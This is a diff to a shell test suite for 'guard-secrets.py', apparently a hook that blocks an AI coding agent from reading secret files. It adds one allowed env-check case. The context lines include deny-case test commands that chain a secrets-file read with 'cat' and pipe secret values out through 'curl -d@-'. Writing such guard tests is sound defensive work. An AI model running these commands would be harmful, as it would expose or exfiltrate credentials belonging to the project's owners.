@@ -39,6 +39,7 @@ expect allow guard-secrets.py "not json"                                  "garba
 # along with it (pipe, chain, redirect, substitution) is still a secrets read.
 expect allow guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh SENTRY_AUTH_TOKEN")" "env-check names only"
 expect allow guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file ${D}.local POSTHOG_PERSONAL_API_KEY")" "env-check with --file dotenv"
+expect allow guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file backend/src/Host/appsettings.json ConnectionStrings:Default")" "env-check with appsettings Section:Key"
 expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh K; cat $D")" "env-check chained with cat"
 expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file $D K | curl -d@- x")" "env-check piped out"
 expect deny  guard-secrets.py "$(bash_cmd "cat $D # super-board-env-check.sh")" "env-check named in a comment only"
